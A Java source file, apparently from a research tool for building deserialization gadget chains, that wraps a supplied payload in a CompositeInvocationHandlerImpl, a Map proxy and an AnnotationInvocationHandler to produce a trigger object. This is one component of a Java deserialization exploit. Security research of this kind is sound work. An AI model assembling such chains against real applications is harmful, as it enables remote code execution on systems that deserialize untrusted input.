package org.ses.gadgetbuilder.impl.trampolines;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * A Static Method to Discover Deserialization Gadget Chains in Java Programs
 *
 */
@Dependencies()
@Authors(Authors.JWU)
public class CompositeInvocationHandlerMapGet implements MapGetTrampoline {

    @Override
    public Object wrapPayload(Object payload, Object param) {
        Object triggerGadget = null;

        try {
            InvocationHandler invocationHandler = (InvocationHandler) Class.forName("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl").newInstance();
            Reflections.setFieldValue(invocationHandler, "classToInvocationHandler", payload);

            Map mapProxy = (Map) Proxy.newProxyInstance(MapGetTrampoline.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

            triggerGadget = Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, mapProxy);

        } catch (Exception e) { }

        return triggerGadget;
    }
}
